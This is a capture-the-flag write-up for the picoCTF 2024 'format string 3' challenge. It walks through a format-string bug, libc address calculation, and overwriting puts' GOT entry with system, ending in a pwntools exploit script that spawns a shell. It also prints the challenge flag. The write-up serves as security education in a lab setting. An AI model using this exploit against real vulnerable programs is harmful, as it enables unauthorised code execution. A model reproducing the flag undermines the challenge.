# format string 3 Writeup

Points: 300<br>
Challenge Author: SkrubLawd

Description:<br>
This program doesn't contain a win function. How can you win?

Hint:<br>
Is there any way to change what a function points to?

## Solution

Looking at the provided source code, we can see a suspicious variable normal_string, which is "/bin/sh". This suggests that we're meant to pop a shell. We can also see that this string is passed as an arguments for the final puts call. Knowing this (and with the hint to have a function point somwhere else), we can deduct that we need to change what the final puts call points to from puts(normal_string) to system(normal_string).<br>
![image](https://github.com/martinlaubscher/picoctf2024/assets/113263884/6b488607-2679-440f-b86e-002164e20b58)

Since puts is a libc function, it gets called via its got (global offset table) entry. if we can change this entry to point to system instead, we can pop a shell!

So, we check the got entry for puts in radare2 and see that its stored at 0x404018 (use the ```v``` command to change to visual mode)
![image](https://github.com/martinlaubscher/picoctf2024/assets/113263884/7989ad93-9e98-4953-893e-eba048af8ae4)
![image](https://github.com/martinlaubscher/picoctf2024/assets/113263884/3cdbef57-1481-4e4a-ac02-e77e66399445)

Next, we need to find a way to write to this address. The printf call in main looks like a good target since it's missing a format specifier.

By fuzzing the input with something like:<br>
```python3 -c 'print("A"*8 + ".%p"*50)' | ./format-string-3```<br>
We find that we control the offset at 38. I also wrote a small script to find the offset so I can reuse it for future challenges (find_offset.py).<br>
![image](https://github.com/martinlaubscher/picoctf2024/assets/113263884/d3d3572e-c12c-4ab9-9ea7-92e8369d727c)

Next, we need to determine the address of the system call at runtime. Luckily, the program "leaks" the address of setvbuf after it has been loaded. Now we can check the static offset from the libc start address and can determine the start address of libc at runtime:<br>
```readelf -s libc.so.6 | grep setvbuf```<br>
This gives us the offset of setvbuf from the libc start address, which is 0x7a3f0<br>
![image](https://github.com/martinlaubscher/picoctf2024/assets/113263884/edfa4b97-a485-46de-b2bc-76b2f660d97b)

Now, we can calculate the libc address at runtime using the leaked address and the offset we just found:<br>
leaked_address - 0x7a3f0 = loaded_libc_start

In a similar fashion, we can now calculate the address of the system call at runtime:<br>
```readelf -s libc.so.6 | grep system```<br>
this gives us the offset of setvbuf from the libc start address, which is 0x4f760<br>
![image](https://github.com/martinlaubscher/picoctf2024/assets/113263884/b80ecc01-9fb2-49bd-8790-1de8d999173a)

Now, we can calculate the system call address at runtime using the libc start address and the offset we just found:<br>
system_call_address = libc_start + 0x4f760<br>

Finally, we have everything together to write our exploit in python using pwntools!
```
from pwnlib.fmtstr import fmtstr_payload
from pwn import *

context.clear(arch = 'amd64')

p = process('./format-string-3')

#p = remote('rhea.picoctf.net', 50329)

p.recvuntil(": ")
received = p.recvline().strip()
leaked_address = int(received,16)

libc_start = leaked_address - 0x7a3f0
system_call = libc_start + 0x4f760

payload = fmtstr_payload(38, {0x404018 : system_call}) #overwriting the got entry for puts

p.sendline(payload)
p.interactive()
```
And just like that, we have popped a shell and can get the flag!<br>
```picoCTF{G07_G07?_6d11af9f}```<br>
![image](https://github.com/martinlaubscher/picoctf2024/assets/113263884/45f1d7a1-ba3c-41b9-ae66-cc05f8b9c6bf)
